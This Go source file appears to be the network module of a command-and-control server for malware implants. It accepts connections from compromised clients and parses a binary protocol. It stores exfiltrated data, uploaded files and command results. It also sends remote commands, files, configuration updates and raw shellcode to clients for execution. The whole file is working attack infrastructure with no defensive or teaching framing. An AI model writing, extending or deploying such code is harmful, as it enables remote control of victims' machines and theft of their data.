package network

import (
	"backend/models"
	"backend/utils"
	"encoding/binary"
	"fmt"
	"log"
	"time"
)

func handleClientConnection(client *models.Client) {
	defer func() {
		client.Conn.Close()
		RemoveClient(client.IPAddress)
		log.Printf("Client disconnected: %s", client.ID)
	}()

	buffer := make([]byte, 4096)

	for {
		// Set read timeout
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		n, err := client.Conn.Read(buffer)
		if err != nil {
			log.Printf("Read error from client %s: %v", client.ID, err)
			return
		}

		if n > 0 {
			message, err := parseBinaryMessage(buffer[:n])
			if err != nil {
				log.Printf("Parse error from client %s: %v", client.ID, err)
				continue
			}

			processClientMessage(client, message)
			client.LastSeen = time.Now()
		}
	}
}

func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("message too short")
	}

	msg := &models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: binary.LittleEndian.Uint32(data[0:4]),
			DataSize:    binary.LittleEndian.Uint32(data[4:8]),
			MessageID:   binary.LittleEndian.Uint32(data[8:12]),
		},
	}

	if msg.Header.DataSize > 0 {
		if len(data) < 12+int(msg.Header.DataSize) {
			return nil, fmt.Errorf("incomplete message data")
		}
		msg.Data = make([]byte, msg.Header.DataSize)
		copy(msg.Data, data[12:12+msg.Header.DataSize])
	}

	return msg, nil
}

func processClientMessage(client *models.Client, msg *models.InternalMessage) {
	// Create message record
	clientMessage := models.ClientMessage{
		Timestamp: time.Now(),
		MessageID: msg.Header.MessageID,
		DataSize:  len(msg.Data),
		Content:   string(msg.Data),
	}

	switch msg.Header.MessageType {
	case models.MESSAGE_HANDSHAKE:
		clientMessage.Type = "HANDSHAKE"
		log.Printf("Handshake from client %s", client.ID)
		sendWelcomeMessage(client)

	case models.MESSAGE_HEARTBEAT:
		clientMessage.Type = "HEARTBEAT"
		log.Printf("Heartbeat from client %s", client.ID)

	case models.MESSAGE_SYS_INFO:
		clientMessage.Type = "SYS_INFO"
		log.Printf("System info from client %s: %d bytes", client.ID, len(msg.Data))

	case models.MESSAGE_COMMAND_RESULT:
		clientMessage.Type = "COMMAND_RESULT"
		log.Printf("Command result from client %s (ID: %d):\n%s",
			client.ID, msg.Header.MessageID, string(msg.Data))

	case models.MESSAGE_DATA_EXFIL:
		clientMessage.Type = "DATA_EXFIL"
		log.Printf("Data exfiltration from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveExfilData(client.ID, msg.Data)

	case models.MESSAGE_UPLOAD_FILE:
		clientMessage.Type = "FILE_UPLOAD"
		log.Printf("File upload from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveUploadedFile(client.ID, msg.Data)

	case models.MESSAGE_ERROR_REPORT:
		clientMessage.Type = "ERROR_REPORT"
		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
	}

	// Store the message
	clientsMutex.Lock()
	client.Messages = append(client.Messages, clientMessage)

	// Keep only last 100 messages to prevent memory issues
	if len(client.Messages) > 100 {
		client.Messages = client.Messages[1:]
	}
	clientsMutex.Unlock()
}

func sendBinaryMessage(client *models.Client, msg models.InternalMessage) error {
	data := serializeBinaryMessage(msg)
	_, err := client.Conn.Write(data)
	return err
}

func serializeBinaryMessage(msg models.InternalMessage) []byte {
	data := make([]byte, 12+len(msg.Data))

	binary.LittleEndian.PutUint32(data[0:4], msg.Header.MessageType)
	binary.LittleEndian.PutUint32(data[4:8], msg.Header.DataSize)
	binary.LittleEndian.PutUint32(data[8:12], msg.Header.MessageID)

	if len(msg.Data) > 0 {
		copy(data[12:], msg.Data)
	}

	return data
}

func sendWelcomeMessage(client *models.Client) {
	welcome := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_HANDSHAKE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    0,
		},
	}
	sendBinaryMessage(client, welcome)
}

// Client communication functions
func SendCommandToClient(clientAddr string, command string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_COMMAND,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(command)),
		},
		Data: []byte(command),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent EXECUTE_COMMAND to client %s: %s", clientAddr, command)
	return nil
}

func SendFileToClient(clientAddr string, fileData []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_DOWNLOAD_FILE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(fileData)),
		},
		Data: fileData,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent DOWNLOAD_FILE to client %s: %d bytes", clientAddr, len(fileData))
	return nil
}

func SendShellcodeToClient(clientAddr string, shellcode []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_SHELL_CODE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(shellcode)),
		},
		Data: shellcode,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent EXECUTE_SHELL_CODE to client %s: %d bytes", clientAddr, len(shellcode))
	return nil
}

func UpdateClientConfig(clientAddr string, config string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_CONFIG_UPDATE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(config)),
		},
		Data: []byte(config),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent CONFIG_UPDATE to client %s", clientAddr)
	return nil
}
